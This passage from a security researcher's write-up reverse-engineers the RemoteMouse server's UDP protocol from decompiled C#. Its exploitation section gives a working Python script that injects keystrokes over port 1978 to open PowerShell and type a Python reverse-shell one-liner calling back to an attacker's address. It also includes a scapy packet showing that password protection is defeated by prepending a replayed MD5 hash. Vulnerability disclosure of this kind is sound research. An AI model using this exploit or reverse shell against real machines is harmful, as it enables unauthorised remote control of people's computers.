            <span class="n">array2</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">array2</span> <span class="k">if</span> <span class="n">c</span><span class="p">]</span> <span class="c1"># Equivalent to passing the StringSplitOptions.RemoveEmptyEntries
</span>            <span class="n">virtualKeyCodes</span> <span class="o">=</span> <span class="n">getVirtualKeyCodes</span><span class="p">(</span><span class="n">array2</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
            <span class="n">virtualKeyCodes2</span> <span class="o">=</span> <span class="n">getVirtualKeyCodes</span><span class="p">(</span><span class="n">array2</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
            <span class="c1"># InputSimulator().Keyboard.ModifiedKeyStroke(virtualKeyCodes2, virtualKeyCodes)
</span>            <span class="k">return</span>

        <span class="k">if</span> <span class="s">'[noe]'</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
            <span class="n">array3</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
            <span class="n">array3</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">A_0</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="n">A_1</span><span class="o">-</span><span class="mi">5</span><span class="p">])</span>
            <span class="n">string</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
            <span class="c1"># InputSimulator().Keyboard.TextEntry(string)
</span>            <span class="k">return</span>

        <span class="k">if</span> <span class="s">'[wiod]'</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
            <span class="n">array4</span> <span class="o">=</span> <span class="n">_split</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="s">'[wiod]'</span><span class="p">)</span>
            <span class="c1"># x.c(chr(int(array4[-1])))
</span>            <span class="k">return</span>
        
        <span class="k">if</span> <span class="s">'[wiou]'</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
            <span class="n">array5</span> <span class="o">=</span> <span class="n">_split</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="s">'[wiou]'</span><span class="p">)</span>
            <span class="c1"># x.b(chr(int(array5[-1])))
</span>            <span class="k">return</span>

        <span class="k">if</span> <span class="s">'[kld]'</span> <span class="ow">in</span> <span class="n">text</span> <span class="ow">and</span> <span class="s">'[*]'</span> <span class="ow">in</span> <span class="n">text</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">text</span> <span class="o">=</span> <span class="n">text</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span>
                <span class="n">array6</span> <span class="o">=</span> <span class="n">_split</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="s">'[*]'</span><span class="p">)</span>
                <span class="n">virtualKeyCodes3</span> <span class="o">=</span> <span class="n">getVirtualKeyCodes</span><span class="p">(</span><span class="n">array6</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
                <span class="n">listVirtualKeyCodes</span> <span class="o">=</span> <span class="p">[</span><span class="n">getVirtualKeyCodes</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">array6</span><span class="p">]</span> <span class="c1"># Renamed this var to avoid smashing reference to `list`
</span>                <span class="n">InputSimulator</span><span class="p">().</span><span class="n">Keyboard</span><span class="p">.</span><span class="n">ModifiedKeyStroke</span><span class="p">(</span><span class="n">listVirtualKeyCodes</span><span class="p">,</span> <span class="n">virtualKeyCodes3</span><span class="p">)</span>
                <span class="k">return</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">return</span>
        
        <span class="k">if</span> <span class="ow">not</span> <span class="n">text</span><span class="p">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'[klu]'</span><span class="p">):</span>
            <span class="n">virtualKeyCodes5</span> <span class="o">=</span> <span class="n">getVirtualKeyCodes</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
            <span class="c1"># InputSimulator().Keyboard.KeyPress(VirtualKeyCodes5)
</span>            <span class="k">pass</span>
        
        <span class="k">return</span>
</code></pre></div></div>

<p>Okay cool, easy 45 minutes wasted, but let’s see how data flows to this function in the first place. I kept poking around in dnSpy until I found this class, <code class="language-plaintext highlighter-rouge">public class Form1 : Form</code> containing the function <code class="language-plaintext highlighter-rouge">private void b()</code>. Again, the function and a Python version written by me are below:</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">private</span> <span class="k">void</span> <span class="nf">b</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">num</span> <span class="p">=</span> <span class="m">10</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">num2</span> <span class="p">=</span> <span class="m">4</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(;;)</span>
    <span class="p">{</span>
        <span class="k">try</span>
        <span class="p">{</span>
            <span class="n">IPEndPoint</span> <span class="n">ipendPoint</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">IPEndPoint</span><span class="p">(</span><span class="n">IPAddress</span><span class="p">.</span><span class="n">Any</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">array</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">a</span><span class="p">.</span><span class="nf">Receive</span><span class="p">(</span><span class="k">ref</span> <span class="n">ipendPoint</span><span class="p">);</span>
            <span class="kt">string</span> <span class="n">@string</span> <span class="p">=</span> <span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetString</span><span class="p">(</span><span class="n">array</span><span class="p">);</span>
            <span class="kt">byte</span><span class="p">[]</span> <span class="n">sourceArray</span> <span class="p">=</span> <span class="n">array</span><span class="p">;</span>
            <span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="n">@string</span><span class="p">;</span>
            <span class="kt">long</span> <span class="n">ticks</span> <span class="p">=</span> <span class="n">DateTime</span><span class="p">.</span><span class="n">Now</span><span class="p">.</span><span class="n">Ticks</span><span class="p">;</span>
            <span class="kt">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="m">3</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">text2</span> <span class="p">==</span> <span class="s">"mos"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="kt">int</span> <span class="n">length</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt16</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="m">3</span><span class="p">));</span>
                <span class="kt">string</span> <span class="n">s</span> <span class="p">=</span> <span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">6</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
                <span class="n">y</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="nf">GetBytes</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="k">ref</span> <span class="n">num</span><span class="p">,</span> <span class="k">ref</span> <span class="n">num2</span><span class="p">,</span> <span class="k">ref</span> <span class="n">ticks</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text2</span> <span class="p">==</span> <span class="s">"abr"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="kt">int</span> <span class="n">length2</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt16</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="m">3</span><span class="p">));</span>
                <span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">6</span><span class="p">,</span> <span class="n">length2</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text2</span> <span class="p">==</span> <span class="s">"mpr"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="kt">int</span> <span class="n">length3</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt16</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="m">3</span><span class="p">));</span>
                <span class="n">u</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt32</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">6</span><span class="p">,</span> <span class="n">length3</span><span class="p">)));</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text2</span> <span class="p">==</span> <span class="s">"web"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="kt">int</span> <span class="n">length4</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt16</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="m">3</span><span class="p">));</span>
                <span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">6</span><span class="p">,</span> <span class="n">length4</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">text2</span> <span class="p">==</span> <span class="s">"key"</span><span class="p">)</span>
            <span class="p">{</span>
                <span class="kt">int</span> <span class="n">num3</span> <span class="p">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">Convert</span><span class="p">.</span><span class="nf">ToInt16</span><span class="p">(</span><span class="n">text</span><span class="p">.</span><span class="nf">Substring</span><span class="p">(</span><span class="m">3</span><span class="p">,</span> <span class="m">3</span><span class="p">));</span>
                <span class="kt">byte</span><span class="p">[]</span> <span class="n">array2</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="n">num3</span><span class="p">];</span>
                <span class="n">array2</span><span class="p">.</span><span class="nf">Initialize</span><span class="p">();</span>
                <span class="n">Array</span><span class="p">.</span><span class="nf">Copy</span><span class="p">(</span><span class="n">sourceArray</span><span class="p">,</span> <span class="m">6</span><span class="p">,</span> <span class="n">array2</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">num3</span><span class="p">);</span>
                <span class="n">w</span><span class="p">.</span><span class="nf">a</span><span class="p">(</span><span class="n">array2</span><span class="p">,</span> <span class="n">num3</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">catch</span>
        <span class="p">{</span>
            <span class="n">Thread</span><span class="p">.</span><span class="nf">Sleep</span><span class="p">(</span><span class="m">100</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">class</span> <span class="nc">Form1</span><span class="p">:</span>
    <span class="o">@</span><span class="nb">classmethod</span>
    <span class="k">def</span> <span class="nf">b</span><span class="p">(</span><span class="n">cls</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">ipendPoint</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
        <span class="n">sock</span><span class="p">.</span><span class="n">bind</span><span class="p">((</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">1978</span><span class="p">))</span>

        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">array</span> <span class="o">=</span> <span class="n">sock</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
                <span class="n">string</span> <span class="o">=</span> <span class="n">array</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">)</span>
                <span class="n">sourcearray</span> <span class="o">=</span> <span class="n">array</span>
                <span class="n">text</span> <span class="o">=</span> <span class="n">string</span>
                <span class="n">ticks</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">())</span> <span class="o">/</span> <span class="mi">10000000</span> <span class="c1"># https://stackoverflow.com/questions/4554136
</span>                <span class="n">text2</span> <span class="o">=</span> <span class="n">text</span><span class="p">[:</span><span class="mi">3</span><span class="p">]</span>

                <span class="k">if</span> <span class="n">text2</span> <span class="o">==</span> <span class="s">"mos"</span><span class="p">:</span>
                    <span class="n">length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
                    <span class="n">s</span> <span class="o">=</span> <span class="n">text</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="n">length</span><span class="p">]</span>
                    <span class="c1"># y.a(s.encode('utf-8'), num, num2, ticks)
</span>                
                <span class="k">elif</span> <span class="n">text2</span> <span class="o">==</span> <span class="s">"abr"</span><span class="p">:</span>
                    <span class="n">length2</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
                    <span class="n">text</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="n">length2</span><span class="p">]</span>    
                
                <span class="k">elif</span> <span class="n">text2</span> <span class="o">==</span> <span class="s">"mpr"</span><span class="p">:</span>
                    <span class="n">length3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
                    <span class="n">u</span><span class="p">.</span><span class="n">a</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="n">length3</span><span class="p">]))</span>
                
                <span class="k">elif</span> <span class="n">text2</span> <span class="o">==</span> <span class="s">"web"</span><span class="p">:</span>
                    <span class="n">length5</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
                    <span class="n">text</span><span class="p">[</span><span class="mi">5</span><span class="p">:</span><span class="n">length5</span><span class="p">]</span>
                
                <span class="k">elif</span> <span class="n">text2</span> <span class="o">==</span> <span class="s">"key"</span><span class="p">:</span>
                    <span class="n">num3</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">4</span><span class="p">])</span>
                    <span class="n">array2</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
                    <span class="n">array2</span> <span class="o">+=</span> <span class="n">sourcearray</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="n">num3</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span>
                    <span class="c1"># w.a(array2, num3)
</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># Technically only 100 milliseconds
</span>
</code></pre></div></div>

<p>Alright cool, so if we send information to the server that starts with “key” we can route it to the previous function and inject keystrokes.</p>
      <h2 id="exploitation">
        
        
          Exploitation <a href="#exploitation">#</a>
        
        
      </h2>
    

<p>So how can we exploit this? Essentially, I want a way to run arbitrary commands on a RemoteMouse server from my computer, so let’s build a Python function that will construct a list of strings that will execute what we want it to execute.</p>

<p>To start off, let’s go with the trivial single character injection; we do this by navigating to the code path with the “[ras]” substring detection. Looking at how the data is parsed when we first hit the wire (in the <code class="language-plaintext highlighter-rouge">Form1.b</code> method), the data takes the form of <code class="language-plaintext highlighter-rouge">key &lt;len&gt;[&lt;fmt&gt;]data</code>. In this case, we want the <code class="language-plaintext highlighter-rouge">ras</code> format for single character keystroke injection (don’t ask me what the “ras” means), and we already know how they convert the characters using the XOR-encryption.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">char2pkt</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="s">"""
    Converts an individual character into the full single-character injection packet

    :param s: character to inject
    :type s: str
    :return: packet
    :rtype: str
    """</span>
    <span class="n">i</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">^</span> <span class="mi">53</span>
    <span class="n">rhs</span> <span class="o">=</span> <span class="s">"[ras]{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"key  {}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rhs</span><span class="p">),</span> <span class="n">rhs</span><span class="p">)</span>
</code></pre></div></div>

<p>Nice! Well, looking ahead, what do we actually want to type out for an example exploit? How about opening up powershell to get a reverse-shell callback. To do this, we’ll need two special packets, and then just a bunch of ASCII. So let’s start out with the two special characters: <code class="language-plaintext highlighter-rouge">WIN+R</code> and <code class="language-plaintext highlighter-rouge">ENTER</code>.</p>

<p><code class="language-plaintext highlighter-rouge">ENTER</code> is a little odd at first. We see that the logic handling it is at the very last conditional, checking to see that “[kld]” is <em>not</em> in the text, and if so, straight up passes the text to the <code class="language-plaintext highlighter-rouge">getVirtualKeyCode</code> function. By looking at the function in dnSpy, we can see it can expect the “rtn” string (everything is converted to lower-case). Now, since this packet won’t need the special “formats” we can straight up pass the virtual key code string representation, and the number to use will be 3 since we need the <code class="language-plaintext highlighter-rouge">Form1.b</code> to take the last 3 characters out. This gives us <code class="language-plaintext highlighter-rouge">key 3rtn</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">special2pkt</span><span class="p">(</span><span class="n">kc</span><span class="p">:</span> <span class="n">Keycodes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="s">"""
    Converts a special character (ENTER, Win, etc.) to a packet.
    This function does NOT validate the special character string is correct.

    :param s: keycode
    :type s: str
    :return: packet
    :rtype: str
    """</span>
    <span class="k">return</span> <span class="s">"key {}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">kc</span><span class="p">.</span><span class="n">value</span><span class="p">),</span> <span class="n">kc</span><span class="p">)</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">WIN+R</code> is going to be a little trickier, we have to combine the keystrokes rather than send them individually. The first function has a conditional looking for “[kld]”, and if it discovers it, uses the “[*]” as a token. Then it takes the first character of the text, saves that as the “base” keystroke, if you will, and all the other special keys delimited by “[*]”. Then it passes these all to a function. So for example, we could open up Task Manager with the key combinations of CTRL+SHIFT+ESC. This translates to <code class="language-plaintext highlighter-rouge">key 23[kld]esc [*]ctrl[*]shift</code>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="k">def</span> <span class="nf">combo2pkt</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">kc</span><span class="p">:</span> <span class="n">Keycodes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="s">"""
    Generates a packet for key combinations (i.e. CTRL+SHIFT+ESC)

    :param s: base key
    :type s: str
    :param kc: modifier keycodes
    :type kc: Keycodes
    :return: [packet
    :rtype: str
    """</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">s</span> <span class="o">=</span> <span class="n">Keycodes</span><span class="p">[</span><span class="n">s</span><span class="p">].</span><span class="n">value</span>
    <span class="n">modifiers</span> <span class="o">=</span> <span class="s">'[*]'</span><span class="o">+</span><span class="s">'[*]'</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">k</span><span class="p">.</span><span class="n">value</span> <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">kc</span><span class="p">])</span>
    <span class="n">rhs</span> <span class="o">=</span> <span class="s">"[kld]{} {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">modifiers</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">"key {}{}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">rhs</span><span class="p">),</span> <span class="n">rhs</span><span class="p">)</span>
</code></pre></div></div>

<p>So now, we can combine all of this together. We’ll write a special parser function just to take a string in and construct a series of packets for it, that way we cover our bases, but for now, let’s make this all works by doing a manual test run.</p>

<p>We essentially need to execute: <code class="language-plaintext highlighter-rouge">[WIN+R]powershell.exe[ENTER]&lt;cmd&gt;[ENTER]</code> (where <code class="language-plaintext highlighter-rouge">&lt;cmd&gt;</code> is my reverse-shell command). So let’s string them all together:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">VICTIM_IP</span> <span class="o">=</span> <span class="s">"192.168.86.195"</span>
<span class="n">cmd</span> <span class="o">=</span> <span class="s">'python -c </span><span class="se">\'</span><span class="s">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""192.168.20.133"",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""/bin/sh"")</span><span class="se">\'</span><span class="s">'</span>

<span class="n">pkts</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">pkts</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">combo2pkt</span><span class="p">(</span><span class="s">'r'</span><span class="p">,</span> <span class="n">Keycodes</span><span class="p">.</span><span class="n">WIN</span><span class="p">))</span>
<span class="n">pkts</span> <span class="o">+=</span> <span class="p">[</span><span class="n">char2pkt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="s">"powershell.exe"</span><span class="p">]</span>
<span class="n">pkts</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">special2pkt</span><span class="p">(</span><span class="n">Keycodes</span><span class="p">.</span><span class="n">ENTER</span><span class="p">))</span>
<span class="n">pkts</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">special2pkt</span><span class="p">(</span><span class="n">Keycodes</span><span class="p">.</span><span class="n">ENTER</span><span class="p">))</span>
<span class="n">pkts</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">special2pkt</span><span class="p">(</span><span class="n">Keycodes</span><span class="p">.</span><span class="n">ENTER</span><span class="p">))</span>
<span class="n">pkts</span> <span class="o">+=</span> <span class="p">[</span><span class="n">char2pkt</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">cmd</span><span class="p">]</span>
<span class="n">pkts</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">special2pkt</span><span class="p">(</span><span class="n">Keycodes</span><span class="p">.</span><span class="n">ENTER</span><span class="p">))</span>

<span class="kn">import</span> <span class="nn">time</span><span class="p">;</span><span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_DGRAM</span><span class="p">)</span>
<span class="k">for</span> <span class="n">pkt</span> <span class="ow">in</span> <span class="n">pkts</span><span class="p">:</span>
    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">pkt</span><span class="p">)</span>
    <span class="n">sock</span><span class="p">.</span><span class="n">sendto</span><span class="p">(</span><span class="n">pkt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span> <span class="p">(</span><span class="n">VICTIM_IP</span><span class="p">,</span> <span class="mi">1978</span><span class="p">))</span>

</code></pre></div></div>

<p>It works! Something important to note is that there seems to be a small race condition when you send too many keystrokes too close together, so I spaced them out with a small timer. I also had a hard time getting Powershell to give me a reverse-shell for some reason, but I did get the TCP callback to my netcat listener, I suspect it was just Windows being Windows.</p>
      <h2 id="passwords">
        
        
          Passwords <a href="#passwords">#</a>
        
        
      </h2>
    

<p>It looks like in the FAQ for Remote Mouse, they explain that a password can be set to prevent others from using your computer:</p>

<blockquote>
  <p>Click Remote Mouse icon on the taskbar (top right corner on Mac, bottom right corner on PC), choose Settings” -&gt; Set password for your computer -&gt; Apply</p>
</blockquote>

<p>Every time you set the password, you have to restart the RemoteMouse server in order for the change to take place. This isn’t very obvious, so I feel like the UI should either tell you to restart, it should restart by itself, or it shouldn’t have to restart at all, and just update the password logic. Also getting the Android App to connect to a server with a password is very janky, like 80% of the time I tried to connect it would just drop the connection, and I couldn’t figure out why.</p>

<p>When you set a password, during the TCP handshake, the “nop” strings are replaced with a “pwd” strings. Interesting, looks like this is just to signify the app to enter a password. I set the password to <code class="language-plaintext highlighter-rouge">PAssword</code> and started inspecting the traffic again.</p>

<p>So a password handshake looks like this (these are hexdumps of the data field of the TCP packets)</p>

<p>Server -&gt; App</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000   53 49 4e 20 31 35 77 69 6e 20 70 77 64 20 70 77   SIN 15win pwd pw
0010   64 20 33 30 30                                    d 300
</code></pre></div></div>

<p>App -&gt; Server</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000   63 69 6e 30 33 36 31 64 38 62 65 38 34 30 37 33   cin0361d8be84073
0010   64 61 39 37 66 36 32 64 66 36 31 32 33 64 35 30   da97f62df6123d50
0020   64 31 32 38 36 65 20 32 34 30                     d1286e 240
</code></pre></div></div>

<p>Server -&gt; App</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000   63 69 6e 20 20 37 73 75 63 63 65 73 73            cin  7success
</code></pre></div></div>

<p>Now if we try sending a keystroke from the phone we get this:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000   62 36 30 63 66 38 62 61 37 65 35 64 61 62 34 62   b60cf8ba7e5dab4b
0010   33 62 36 62 65 64 37 38 62 64 65 31 65 34 37 30   3b6bed78bde1e470
0020   6b 65 79 20 20 37 5b 72 61 73 5d 38 34            key  7[ras]84
</code></pre></div></div>

<p>Wait a minute… Is that an MD5 Hash in front of the plain-text single-key packet?</p>

<p><img src="https://media.tenor.com/images/6f934479914fbd708238bab284eeff0a/tenor.gif" alt="That's Suspicious" /></p>

<p>Let’s do some work in CyberChef real quick:</p>

<ul>
  <li><a href="https://gchq.github.io/CyberChef/#recipe=Analyse_hash()&amp;input=YjYwY2Y4YmE3ZTVkYWI0YjNiNmJlZDc4YmRlMWU0NzA">Detect the hashing algorithm</a></li>
  <li><a href="https://gchq.github.io/CyberChef/#recipe=MD5()&amp;input=UEFzc3dvcmQ">Hash our password (<code class="language-plaintext highlighter-rouge">PAssword</code>) with that hashing algorithm</a></li>
</ul>

<p>Okay, so their idea of encrypting the communications <em>isn’t</em> actually encrypting a packet, it’s prepending the MD5 hash of the password to the beginning of the packet. Let’s make sure this works using scapy:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span> <span class="n">send</span><span class="p">(</span><span class="n">IP</span><span class="p">(</span><span class="n">dst</span><span class="o">=</span><span class="s">"192.168.86.195"</span><span class="p">)</span><span class="o">/</span><span class="n">UDP</span><span class="p">(</span><span class="n">dport</span><span class="o">=</span><span class="mi">1978</span><span class="p">)</span><span class="o">/</span><span class="n">Raw</span><span class="p">(</span><span class="n">load</span><span class="o">=</span><span class="s">"b60cf8ba7e5dab4b3b6bed78bde1e470key  7[ras]87"</span><span class="p">))</span>
<span class="p">.</span>
<span class="n">Sent</span> <span class="mi">1</span> <span class="n">packets</span><span class="p">.</span>
</code></pre></div></div>

<p>Lo and behold, a single ‘b’ was typed into my computer. I tried changing the hash to see what would happen, but that didn’t work unfortunately. So if the traffic is encrypted, all we really have to do is either bruteforce the hash, or sniff out someone else’s traffic. And to determine if a server is using a password, we can simply open up a TCP connection with it and see the response:</p>

